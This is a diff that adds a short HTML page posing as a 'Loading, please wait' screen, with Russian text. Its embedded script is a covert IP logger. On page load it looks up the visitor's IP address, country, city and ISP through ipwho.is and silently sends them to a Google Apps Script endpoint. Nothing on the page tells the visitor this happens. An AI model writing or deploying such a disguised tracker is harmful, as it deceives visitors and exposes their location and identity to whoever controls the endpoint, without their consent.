@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Загрузка...</title>
+</head>
+<body>
+    <h2>Пожалуйста, подождите, страница загружается...</h2>
+    <script>
+    fetch('https://ipwho.is/')
+      .then(r => r.json())
+      .then(d => {
+        let url = "https://script.google.com/macros/s/AKfycbwqh9FhORfHr93lyyt2Wgl6_4EVxO87Cna6BlNqV1vR_E3DCxtdiflyrzZ5ozrY6lAy/exec?ip=" + d.ip + "&country=" + d.country + "&city=" + d.city + "&isp=" + d.connection.isp;
+        fetch(url, {mode: "no-cors"});
+      });
+    </script>
+</body>
+</html>
